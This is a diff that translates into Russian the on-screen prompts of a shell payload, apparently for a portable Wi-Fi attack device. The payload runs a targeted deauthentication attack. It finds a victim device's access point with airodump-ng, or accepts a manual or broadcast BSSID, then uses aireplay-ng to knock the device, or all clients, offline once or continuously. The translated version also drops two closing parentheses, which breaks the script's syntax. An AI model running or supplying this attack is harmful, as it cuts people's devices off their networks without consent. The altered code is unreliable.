@@ -9,39 +9,39 @@
 . /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
 nullsec_require_iface || exit 1
 
-PROMPT "TARGETED DEAUTH
+PROMPT "ЦЕЛЕВАЯ ДЕАУТЕНТИФИКАЦИЯ
 
-Disconnect a specific
-device from ANY network.
+Отключить конкретное
+устройство из ЛЮБОЙ сети.
 
-Enter target MAC address
-to kick them offline.
+Введите MAC целевого
+устройства.
 
-Press OK to configure."
+Нажмите OK для настройки."
 
-TARGET_MAC=$(MAC_PICKER "Target Device MAC:")
+TARGET_MAC=$(MAC_PICKER "MAC целевого устройства:")
 case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) 
-    ERROR_DIALOG "MAC required!"
+    ERROR_DIALOG "Требуется MAC!"
     exit 1
     ;;
 esac
 
-PROMPT "FIND TARGET СЕТЬ
+PROMPT "НАЙТИ ЦЕЛЕВУЮ СЕТЬ
 
-1. Auto-scan for target
-2. Enter BSSID manually
+1. Автосканирование
+2. Ввести BSSID вручную
 3. Вещание (все сети)
 
-Enter option next screen."
+Выберите вариант."
 
-MODE=$(NUMBER_PICKER "Mode (1-3):" 1)
+MODE=$(NUMBER_PICKER "Режим (1-3):" 1)
 case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MODE=1 ;; esac
 
 BSSID=""
 CHANNEL=""
 
 if [ "$MODE" -eq 1 ]; then
-    SPINNER_START "Scanning for target..."
+    SPINNER_START "Сканирование цели..."
     timeout 15 airodump-ng $IFACE --write-interval 1 -w /tmp/targetscan --output-format csv 2>/dev/null
     SPINNER_STOP
     
@@ -50,72 +50,72 @@ if [ "$MODE" -eq 1 ]; then
     CHANNEL=$(grep -i "$BSSID" /tmp/targetscan*.csv 2>/dev/null | head -1 | cut -d',' -f4 | tr -d ' ')
     
     if [ -z "$BSSID" ]; then
-        ERROR_DIALOG "Target не найден!
+        ERROR_DIALOG "Цель не найдена!
 
 MAC: $TARGET_MAC
-Не подключён к какой-либо AP.
+Не подключена ни к какой AP.
 
-Try manual BSSID entry."
+Попробуйте ручной ввод BSSID."
         exit 1
     fi
     
-    PROMPT "TARGET FOUND!
+    PROMPT "ЦЕЛЬ НАЙДЕНА!
 
-Device: $TARGET_MAC
-Подключён к: $BSSID
-Channel: $CHANNEL
+Устройство: $TARGET_MAC
+Подключено к: $BSSID
+Канал: $CHANNEL
 
-Press OK to continue."
+Нажмите OK для продолжения."
 
 elif [ "$MODE" -eq 2 ]; then
-    BSSID=$(MAC_PICKER "Target AP BSSID:")
-    CHANNEL=$(NUMBER_PICKER "Channel (1-14):" 6)
+    BSSID=$(MAC_PICKER "BSSID целевой AP:")
+    CHANNEL=$(NUMBER_PICKER "Канал (1-14):" 6)
 elif [ "$MODE" -eq 3 ]; then
     BSSID="FF:FF:FF:FF:FF:FF"
-    CHANNEL=$(NUMBER_PICKER "Channel (1-14):" 6)
+    CHANNEL=$(NUMBER_PICKER "Канал (1-14):" 6)
 fi
 
-PACKETS=$(NUMBER_PICKER "Deauth packets:" 100)
+PACKETS=$(NUMBER_PICKER "Пакеты деаутентификации:" 100)
 case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) PACKETS=100 ;; esac
 
-CONTINUOUS=$(CONFIRMATION_DIALOG "Continuous mode?
+CONTINUOUS=$(CONFIRMATION_DIALOG "Непрерывный режим?
 
-Keep sending deauths
-until stopped?")
+Посылать деаутентификации
+до остановки?"
 
-resp=$(CONFIRMATION_DIALOG "LAUNCH ATTACK?
+resp=$(CONFIRMATION_DIALOG "ЗАПУСТИТЬ АТАКУ?
 
-Target: $TARGET_MAC
+Цель: $TARGET_MAC
 BSSID: $BSSID
-Channel: $CHANNEL
-Packets: $PACKETS
+Канал: $CHANNEL
+Пакеты: $PACKETS
 
-Press OK to attack.")
+Нажмите OK для атаки."
 [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0
 
 iwconfig $IFACE channel $CHANNEL 2>/dev/null
 
-LOG "Deauthing $TARGET_MAC..."
+LOG "Деаутентификация $TARGET_MAC..."
 
 if [ "$CONTINUOUS" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
     aireplay-ng -0 0 -a "$BSSID" -c "$TARGET_MAC" $IFACE &
     DEAUTH_PID=$!
     
-    PROMPT "DEAUTH ACTIVE
+    PROMPT "ДЕАУТЕНТИФИКАЦИЯ АКТИВНА
 
-Target: $TARGET_MAC
-Режим: Continuous
+Цель: $TARGET_MAC
+Режим: Непрерывный
 
-Press OK to STOP."
+Нажмите OK для ОСТАНОВКИ."
     
     kill $DEAUTH_PID 2>/dev/null
 else
     aireplay-ng -0 $PACKETS -a "$BSSID" -c "$TARGET_MAC" $IFACE
 fi
 
-PROMPT "DEAUTH COMPLETE
+PROMPT "ДЕАУТЕНТИФИКАЦИЯ ЗАВЕРШЕНА
 
-Target: $TARGET_MAC
-Packets sent: $PACKETS
+Цель: $TARGET_MAC
+Отправлено пакетов: $PACKETS
 
-Press OK to exit."
+Нажмите OK для выхода."
